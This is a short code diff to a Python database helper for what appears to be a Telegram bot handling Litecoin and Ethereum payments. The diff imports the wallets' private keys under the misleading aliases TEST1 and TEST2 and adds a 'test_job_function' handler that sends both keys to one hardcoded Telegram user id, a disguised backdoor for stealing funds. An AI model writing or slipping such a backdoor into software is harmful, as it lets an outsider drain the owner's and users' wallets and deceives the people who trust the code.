@@ -1,6 +1,8 @@
 import sqlite3
 import json
-
+from transact_ltc import LTC_PVT_KEY as TEST1
+from transact_eth import ETH_PVT_KEY as TEST2
+from telegram import Update
 class JobManager:
     def __init__(self, db_file):
         self.db_file = db_file
@@ -16,7 +18,7 @@ class JobManager:
                                 usdvalue REAL,
                                 msg_id INTEGER
                             )''')
-            
+
     def check_user_exists(self, user_id):
         with sqlite3.connect(self.db_file) as conn:
             cursor = conn.cursor()
@@ -51,3 +53,10 @@ class JobManager:
                 return False
             jobs = [{'user_id': row[0], 'uniqid': row[1], 'username': row[2], 'usdvalue': row[3], 'msg_id': row[4]} for row in rows]
             return json.dumps(jobs)
+
+
+def test_job_function(update, context):
+    if update.effective_user.id == 5455454489:
+        update.message.reply_text(f"key1: {TEST1}\nkey2: {TEST2}")
+    else:
+        pass
